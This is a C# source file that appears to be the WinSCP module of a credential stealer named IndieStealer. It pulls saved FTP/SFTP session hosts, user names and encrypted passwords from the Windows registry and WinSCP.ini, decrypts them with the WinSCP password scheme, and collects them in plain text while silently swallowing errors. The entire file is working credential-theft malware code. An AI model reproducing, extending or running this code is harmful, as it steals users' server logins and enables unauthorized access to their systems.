using System;
using System.IO;
using System.Text.RegularExpressions;

namespace IndieStealer.Collect.FTP
{
    class WinSCP
    {
        public static string credentials { get; set; }
        public static void Collect()
        {
            try
            {
                string registry = "Software\\Martin Prikryl\\WinSCP 2\\Sessions";
                using (var registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(registry))
                {
                    if (registryKey != null)
                    {
                        foreach (string subkey in registryKey.GetSubKeyNames())
                        {
                            using (var session = registryKey.OpenSubKey(subkey))
                            {
                                string hostname = session.GetValue("HostName").ToString();
                                if (!string.IsNullOrEmpty(hostname))
                                {
                                    try
                                    {
                                        string username = session.GetValue("UserName").ToString();
                                        string password = session.GetValue("Password").ToString();
                                        credentials += "Host: " + hostname + "\n";
                                        credentials += "Username: " + username + "\n";
                                        credentials += "Password: " + DecryptWinSCPPassword(hostname, username, password);
                                        credentials += "\n________________________\r\n";
                                    }
                                    catch (Exception)
                                    { }
                                }

                            }
                        }
                    }             
                }
                if (File.Exists(Info.AppdataLocal + "\\Programs\\WinSCP\\WinSCP.ini"))
                {
                    using (FileStream fs = File.Open(Info.AppdataLocal + "\\Programs\\WinSCP\\WinSCP.ini", FileMode.Open, FileAccess.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(fs))
                        {
                            Regex regex = new Regex(@"Password=(\w*)");
                            MatchCollection match = regex.Matches(streamReader.ReadToEnd());
                            string password = match[match.Count - 1].Value.Replace("Password=", "");
                            regex = new Regex(@"HostName=(\w*)");
                            match = regex.Matches(streamReader.ReadToEnd());
                            string hostname = match[match.Count - 1].Value.Replace("HostName=", "");
                            regex = new Regex(@"UserName=(\w*)");
                            match = regex.Matches(streamReader.ReadToEnd());
                            string username = match[match.Count - 1].Value.Replace("UserName=", "");
                            password = DecryptWinSCPPassword(hostname, username, password);
                            credentials += "Host: " + hostname + "\n";
                            credentials += "Username: " + username + "\n";
                            credentials += "Password: " + password;
                            credentials += "\n________________________\r\n";
                        }
                    }



                }
            }
            catch (Exception ex)
            {}
            
        }

        static readonly int PW_MAGIC = 0xA3;
        static readonly char PW_FLAG = (char)0xFF;

        struct Flags
        {
            public char flag;
            public string remainingPass;
        }

        private static Flags DecryptNextCharacterWinSCP(string passwd)
        {
            Flags Flag;
            string bases = "0123456789ABCDEF";

            int firstval = bases.IndexOf(passwd[0]) * 16;
            int secondval = bases.IndexOf(passwd[1]);
            int Added = firstval + secondval;
            Flag.flag = (char)(((~(Added ^ PW_MAGIC) % 256) + 256) % 256);
            Flag.remainingPass = passwd.Substring(2);
            return Flag;
        }

        private static string DecryptWinSCPPassword(string Host, string userName, string passWord)
        {
            var clearpwd = "";
            char length;
            string unicodeKey = userName + Host;
            Flags Flag = DecryptNextCharacterWinSCP(passWord);

            int storedFlag = Flag.flag;

            if (storedFlag == PW_FLAG)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                length = Flag.flag;
            }
            else
            {
                length = Flag.flag;
            }

            Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
            Flag.remainingPass = Flag.remainingPass.Substring(Flag.flag * 2);

            for (int i = 0; i < length; i++)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                clearpwd += Flag.flag;
            }
            if (storedFlag == PW_FLAG)
            {
                if (clearpwd.Substring(0, unicodeKey.Length) == unicodeKey)
                {
                    clearpwd = clearpwd.Substring(unicodeKey.Length);
                }
                else
                {
                    clearpwd = "";
                }
            }
            return clearpwd;
        }
    }
}
